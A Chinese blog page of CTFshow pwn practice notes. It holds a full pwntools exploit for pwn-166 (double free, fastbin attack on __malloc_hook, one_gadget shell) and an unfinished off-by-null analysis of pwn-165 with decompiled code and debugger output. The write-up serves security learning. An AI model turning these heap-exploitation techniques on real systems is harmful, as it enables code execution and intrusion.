<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CTFshow 刷题记录 162-...持续更新 | Langx</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.woff2"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
  font-family: Bender;
  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
  font-family: BenderLight;
  src: local('BenderLight'), url("/font/BenderLight.woff2") format('woff2');
}
@font-face {
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
</style><meta name="page-config" content="{&quot;code_fold&quot;:null}"><script class="pjax-js">var config = {"root":"/","code_fold":15,"search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}};
var page_config = {
  code_fold: null
};
function updatePageConfig() {
  var newPageConfig = document.querySelector('meta[name="page-config"]');
  if (newPageConfig) {
    page_config = JSON.parse(newPageConfig.content);
  }
}
document.addEventListener('pjax:complete', function() { updatePageConfig(); });
updatePageConfig();</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
 menuSettings: {
   zoom: "None"
 },
 showMathMenu: false,
 jax: ["input/TeX","output/CommonHTML"],
 extensions: ["tex2jax.js"],
 TeX: {
   extensions: ["AMSmath.js","AMSsymbols.js"],
   equationNumbers: {
     autoNumber: "AMS"
   }
 },
 tex2jax: {
   inlineMath: [["\\(", "\\)"]],
   displayMath: [["\\[", "\\]"]]
 }
});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
 --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
 --light-background: url('/img/bk.jpg');
 --theme-encrypt-confirm: '确认'
}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer src="https://vercount.one/js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
window.mermaid = mermaid;
code.paintMermaid();
</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
  menuSettings: {
    zoom: "None"
  },
  showMathMenu: false,
  jax: ["input/TeX","output/CommonHTML"],
  extensions: ["tex2jax.js"],
  TeX: {
    extensions: ["AMSmath.js","AMSsymbols.js"],
    equationNumbers: {
      autoNumber: "AMS"
    }
  },
  tex2jax: {
    inlineMath: [["\\(", "\\)"]],
    displayMath: [["\\[", "\\]"]]
  }
});
</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.vercount','meta[name=page-config]'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => {
 const script = document.createElement('script');
 script.src = 'https://vercount.one/js';
 document.head.appendChild(script);
});reset()})</script><script class="pjax-js">reset= () => {MathJax.Hub.Queue(["Typeset", MathJax.Hub]);document.querySelector('.lg-container')?.remove()
const postBg = document.querySelector('#post-bg');
if (postBg) lightGallery(postBg, {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.vercount','meta[name=page-config]'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => {
 const script = document.createElement('script');
 script.src = 'https://vercount.one/js';
 document.head.appendChild(script);
});reset()})</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>CTFshow 刷题记录 162-...持续更新</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2025-12-22T12:56:53.875Z" id="date"> 2025-12-22</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2025-12-21T15:18:27.337Z" id="updated"> 2025-12-21</time></div></span><br><span id="vercount_container_page_pv">页面浏览: <span class="control" id="vercount_value_page_pv">加载中...</span></span></div></div><hr><div id="post-content"><h1 id="ctfshow-pwn-166"><a href="#ctfshow-pwn-166" class="headerlink" title="ctfshow-pwn-166"></a><strong>ctfshow-pwn-166</strong></h1><p>一道简单的double free</p>
<p>直接贴exp了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>psl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>ps = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>pc = <span class="hljs-keyword">lambda</span> data : p.recvuntil(data)<br>ph = <span class="hljs-keyword">lambda</span> name,data : <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;||<span class="hljs-subst">&#123;name&#125;</span> = &quot;</span>+<span class="hljs-built_in">hex</span>(data))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(pc(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>::].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>binary_name = <span class="hljs-string">&#x27;./pwn166&#x27;</span><br><br>HOST = <span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span><br>PORT =  <span class="hljs-number">28282</span><br>choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please input yes-&gt;Process,no-&gt;Remote&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;y&quot;</span> <span class="hljs-keyword">in</span> choice:<br>    p = process(binary_name)<br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;n&quot;</span> <span class="hljs-keyword">in</span> choice:<br>    p = remote(HOST,PORT)<br>libc_name = <span class="hljs-string">&#x27;libc-2.23.so&#x27;</span><br>libc = ELF(libc_name)<br>e = ELF(binary_name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice</span>):<br>    pc(<span class="hljs-string">&quot;Input your choice:&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(choice))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,name,idx</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    pc(<span class="hljs-string">&quot;Please input the size of the flag&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(size))<br>    pc(<span class="hljs-string">&quot;please input the flag name:&quot;</span>)<br>    psl(name)<br>    pc(<span class="hljs-string">&quot;please input the flag idx:&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    pc(<span class="hljs-string">&quot;Please input the index:&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    pc(<span class="hljs-string">&quot;Please input the index:&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment">#========== Exploit 开始 ==========</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    heap = <span class="hljs-number">0x202060</span><br>    puts_got = e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;1angx&#x27;</span>,<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;1angx&#x27;</span>,<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">#add(0x10,b&#x27;fake&#x27;,2)</span><br>    delete(<span class="hljs-number">0</span>)<br>    show(<span class="hljs-number">0</span>)<br>    malloc_hook = uu64()-<span class="hljs-number">0x68</span><br>    ph(<span class="hljs-string">&quot;malloc_hook&quot;</span>,malloc_hook)<br>    base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <span class="hljs-comment">#libc =LibcSearcher(&quot;__malloc_hook&quot;,malloc_hook)  </span><br>    <span class="hljs-comment">#base = malloc_hook - libc.dump(&quot;__malloc_hook&quot;)</span><br>    ph(<span class="hljs-string">&quot;base&quot;</span>,base)<br><br>    <span class="hljs-comment">#realloc = base + libc.dump(&quot;realloc&quot;)</span><br>    realloc = base + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>    ph(<span class="hljs-string">&quot;realloc&quot;</span>,realloc)<br>    onegg = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xef9f4</span>,<span class="hljs-number">0xf1147</span> ]<br>    ogg = base + onegg[<span class="hljs-number">3</span>]<br>    ph(<span class="hljs-string">&quot;ogg&quot;</span>,ogg)<br>    fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br>    add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;engo&#x27;</span>,<span class="hljs-number">2</span>) <br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;2angx&#x27;</span>,<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;3angx&#x27;</span>,<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">0x68</span>,p64(fake_chunk),<span class="hljs-number">5</span>) <br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;4angx&#x27;</span>,<span class="hljs-number">6</span>)<br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;5angx&#x27;</span>,<span class="hljs-number">7</span>)<br>    p1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)+p64(ogg)+p64(realloc+<span class="hljs-number">8</span>)<br>    add(<span class="hljs-number">0x68</span>,p1,<span class="hljs-number">8</span>)<br>    <br>    <span class="hljs-comment">#bug()</span><br>    cmd(<span class="hljs-number">1</span>)<br>exp()<br>p.interactive()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">for i in range(100):</span><br><span class="hljs-string">    p = remote(HOST,PORT)</span><br><span class="hljs-string">    exp(i)</span><br><span class="hljs-string">    sleep(0.5)</span><br><span class="hljs-string">    psl(&quot;cat flag&quot;)</span><br><span class="hljs-string">    a = p.recvline()</span><br><span class="hljs-string">    if a in b&#x27;flag&#x27;:   </span><br><span class="hljs-string">        p.interactive()</span><br><span class="hljs-string">    else:</span><br><span class="hljs-string">        p.close()</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure>

<h1 id="ctfshow-pwn-165"><a href="#ctfshow-pwn-165" class="headerlink" title="ctfshow-pwn-165"></a>ctfshow-pwn-165</h1><p><del>堆利用里面放一个栈题也是没话说</del></p>
<p>先checksec一下吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; checksec pwn165<br>[*] <span class="hljs-string">&#x27;/home/jian/Desktop/jiaoben/ctfshow/heap_qianzhi/pwn165/pwn165&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x3ff000)<br><br></code></pre></td></tr></table></figure>

<p>没啥保护，看看ida</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-14h] BYREF</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v5; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  init_0(a1, a2, a3);<br>  ctfshow();<br>  v5 = <span class="hljs-string">&quot;%d&quot;</span>;<br>  change();<br>  v6 = (<span class="hljs-type">char</span> *)sub_400D56();<br>  menu();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)_isoc99_scanf(v5, &amp;v4) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">switch</span> ( v4 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note:&quot;</span>);<br>        v6 = edit();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note:%s\n&quot;</span>, v6);                <span class="hljs-comment">// show</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        save(v6);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Saved!&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        fclose(stream);<br>        v3 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)sub_400B66(&amp;unk_602040);<br>        unlink(v3);<br>        change();<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-keyword">if</span> ( stream )<br>          fclose(stream);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choice&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>edit:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">edit</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-100h] BYREF</span><br><br>  _isoc99_scanf(<span class="hljs-string">&quot;%256s&quot;</span>, s);<br>  <span class="hljs-keyword">return</span> strdup(s);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>乍一看以为没有溢出，但是这个是_isoc99_scanf()函数，当我们读取字符串时，会在末尾自动添加 <code>\0</code></p>
<p>这就造成了一个off_by_null</p>
<p>那有这个能干啥呢，调试看看</p>
<p>运行到edit输入部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">► 0x400e22    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt;<br>       format: 0x401619 ◂— 0x6e49007336353225 /* &#x27;%256s&#x27; */<br>       vararg: 0x7fffffffdd48 —▸ 0x400a70 ◂— xor ebp, ebp<br></code></pre></td></tr></table></figure>

<p>我们先看看此时stack</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pwndbg&gt; stack 34<br>00:0000│ rsi rsp 0x7fffffffdd48 —▸ 0x400a70 ◂— xor ebp, ebp<br>01:0008│-0f8     0x7fffffffdd50 —▸ 0x7fffffffdf50 ◂— 1<br>02:0010│-0f0     0x7fffffffdd58 ◂— 0<br>03:0018│-0e8     0x7fffffffdd60 ◂— 0<br>04:0020│-0e0     0x7fffffffdd68 —▸ 0x7fffffffde78 —▸ 0x7fffffffde70 —▸ 0x604280 ◂— 8<br>05:0028│-0d8     0x7fffffffdd70 —▸ 0x7ffff72558a9 (printf+153) ◂— add rsp, 0xd8<br>06:0030│-0d0     0x7fffffffdd78 —▸ 0x603040 ◂— 0xfbad2490<br>07:0038│-0c8     0x7fffffffdd80 ◂— 0x3000000008<br>08:0040│-0c0     0x7fffffffdd88 —▸ 0x7fffffffde58 —▸ 0x400a70 ◂— xor ebp, ebp<br>09:0048│-0b8     0x7fffffffdd90 —▸ 0x7fffffffdd98 ◂— 0<br>0a:0050│-0b0     0x7fffffffdd98 ◂— 0<br>0b:0058│-0a8     0x7fffffffdda0 ◂— 1<br>0c:0060│-0a0     0x7fffffffdda8 —▸ 0x7ffff75c6790 ◂— 0<br>0d:0068│-098     0x7fffffffddb0 ◂— 0x10<br>0e:0070│-090     0x7fffffffddb8 ◂— 0<br>... ↓            2 skipped<br>11:0088│-078     0x7fffffffddd0 —▸ 0x7ffff727a419 (_IO_do_write+121) ◂— mov r13, rax<br>12:0090│-070     0x7fffffffddd8 ◂— 7<br>13:0098│-068     0x7fffffffdde0 —▸ 0x7ffff75c5620 (_IO_2_1_stdout_) ◂— 0xfbad2887<br>14:00a0│-060     0x7fffffffdde8 ◂— 0xa /* &#x27;\n&#x27; */<br>15:00a8│-058     0x7fffffffddf0 —▸ 0x401611 ◂— xor eax, 0x7845202e /* &#x27;5. Exit&#x27; */<br>16:00b0│-050     0x7fffffffddf8 —▸ 0x7fffffffdf50 ◂— 1<br>17:00b8│-048     0x7fffffffde00 —▸ 0x7ffff727a82b (_IO_file_overflow+235) ◂— cmp eax, -1<br>18:00c0│-040     0x7fffffffde08 ◂— 7<br>19:00c8│-038     0x7fffffffde10 —▸ 0x7ffff75c5620 (_IO_2_1_stdout_) ◂— 0xfbad2887<br>1a:00d0│-030     0x7fffffffde18 —▸ 0x401611 ◂— xor eax, 0x7845202e /* &#x27;5. Exit&#x27; */<br>1b:00d8│-028     0x7fffffffde20 —▸ 0x7ffff726f80a (puts+362) ◂— cmp eax, -1<br>1c:00e0│-020     0x7fffffffde28 ◂— 0<br>1d:00e8│-018     0x7fffffffde30 —▸ 0x7fffffffde48 —▸ 0x7fffffffde78 —▸ 0x7fffffffde70 —▸ 0x604280 ◂— ...<br>1e:00f0│-010     0x7fffffffde38 —▸ 0x400a70 ◂— xor ebp, ebp<br>1f:00f8│-008     0x7fffffffde40 —▸ 0x400d53 ◂— nop <br>20:0100│ rbp     0x7fffffffde48 —▸ 0x7fffffffde78 —▸ 0x7fffffffde70 —▸ 0x604280 ◂— 8<br>21:0108│+008     0x7fffffffde50 —▸ 0x400f73 ◂— mov qword ptr [rbp - 8], rax<br></code></pre></td></tr></table></figure>

<p>我们的offbynull就可以修改rbp的末位字节为00</p>
<p>还记得我们第一次输入菜单的时候</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">v5 = <span class="hljs-string">&quot;%d&quot;</span>;<span class="hljs-comment">//很可疑</span><br>change();<br>v6 = (<span class="hljs-type">char</span> *)sub_400D56();<br>menu();<br><span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)_isoc99_scanf(v5, &amp;v4) &lt;= <span class="hljs-number">0</span> )<br></code></pre></td></tr></table></figure>

<p>这里为啥还要定义一个v5，看看汇编</p>
